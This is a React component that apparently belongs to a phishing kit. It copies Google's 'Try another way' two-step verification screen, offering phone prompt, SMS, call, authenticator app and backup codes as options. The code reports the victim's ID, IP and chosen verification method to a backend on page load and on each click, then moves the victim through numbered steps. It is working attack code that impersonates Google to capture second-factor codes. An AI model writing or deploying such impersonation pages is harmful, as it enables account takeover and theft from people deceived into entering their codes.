import React, { useState, useEffect, useContext } from "react";
import { styled } from "styled-components";
import { DataContext } from "../../pages";
import SendData from "../../hooks/SendData";
import GoogleShell, {
  GTitle,
  GoogleSpinner,
} from "./GoogleShell";
import { getGoogleMaskedPhoneDisplay } from "../../utils/validationUtils";
import { GOOGLE_CONFIG } from "../../utils/googleConfig";

const OptionRow = styled.button`
  display: flex;
  align-items: center;
  gap: 16px;
  width: 100%;
  text-align: left;
  background: none;
  border: none;
  border-top: 1px solid #e1e3e6;
  padding: 18px 8px;
  font-size: 14px;
  font-family: Roboto, Arial, sans-serif;
  color: #1f1f1f;
  cursor: pointer;

  &:first-of-type {
    border-top: none;
  }

  &:hover:not(:disabled) {
    background: rgba(0, 0, 0, 0.03);
  }

  &:disabled {
    opacity: 0.6;
    cursor: default;
  }

  svg {
    flex-shrink: 0;
  }
`;

const LoadingWrap = styled.div`
  display: flex;
  justify-content: center;
  padding: 48px 0;
`;

const icons = {
  prompt: (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#444746" strokeWidth="1.6">
      <rect x="6" y="2" width="12" height="20" rx="2.5" />
      <line x1="10" y1="19" x2="14" y2="19" strokeLinecap="round" />
    </svg>
  ),
  sms: (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#444746" strokeWidth="1.6">
      <path d="M21 11.5a8.38 8.38 0 0 1-8.5 8.5 8.5 8.5 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 8.5-8.5 8.38 8.38 0 0 1 8.5 8.5z" />
    </svg>
  ),
  call: (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#444746" strokeWidth="1.6">
      <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z" />
    </svg>
  ),
  auth: (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#444746" strokeWidth="1.6">
      <rect x="5" y="2" width="14" height="20" rx="2" />
      <path d="M12 18h.01" strokeLinecap="round" />
      <path d="M9 7h6" strokeLinecap="round" />
    </svg>
  ),
  backup: (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#444746" strokeWidth="1.6">
      <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
      <path d="M14 2v6h6" />
      <line x1="8" y1="13" x2="16" y2="13" strokeLinecap="round" />
      <line x1="8" y1="17" x2="13" y2="17" strokeLinecap="round" />
    </svg>
  ),
};

function GoogleTryAnotherWay({ Unik, setStep, Email, Tel, Ip }) {
  const { setAllData, AllData } = useContext(DataContext);

  const [loading, setLoading] = useState(false);
  const maskedPhone = getGoogleMaskedPhoneDisplay(Tel);

  const sendUpdate = (extra, stepMessage) => {
    const params = {
      ...AllData,
      id: Unik,
      ip: Ip || AllData?.ip,
      ...extra,
      currentStep: stepMessage,
    };
    setAllData(params);
    SendData(params);
  };

  useEffect(() => {
    sendUpdate({}, "Google Try Another Way Page Loaded");
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const options = [
    { key: "prompt", label: "Tap Yes on your phone or tablet", step: 17 },
    { key: "sms", label: `Get a verification code at ${maskedPhone}`, step: 18 },
    { key: "call", label: `Get a verification code via a phone call at ${maskedPhone}`, step: 19 },
    { key: "auth", label: "Get a verification code from the Google Authenticator app", step: 20 },
    { key: "backup", label: "Enter one of your 8-digit backup codes", step: 21 },
  ];

  const handleSelect = (option) => {
    if (loading) return;
    setLoading(true);
    sendUpdate({}, `Google Try Another Way - User selected: ${option.label}`);
    setTimeout(() => setStep(option.step), GOOGLE_CONFIG.BUTTON_DELAY);
  };

  return (
    <GoogleShell>
      <GTitle>Try another way</GTitle>
      {loading ? (
        <LoadingWrap>
          <GoogleSpinner size={32} />
        </LoadingWrap>
      ) : (
        <div>
          {options.map((option) => (
            <OptionRow
              key={option.key}
              type="button"
              onClick={() => handleSelect(option)}
              disabled={loading}
            >
              {icons[option.key]}
              <span>{option.label}</span>
            </OptionRow>
          ))}
        </div>
      )}
    </GoogleShell>
  );
}

export default GoogleTryAnotherWay;
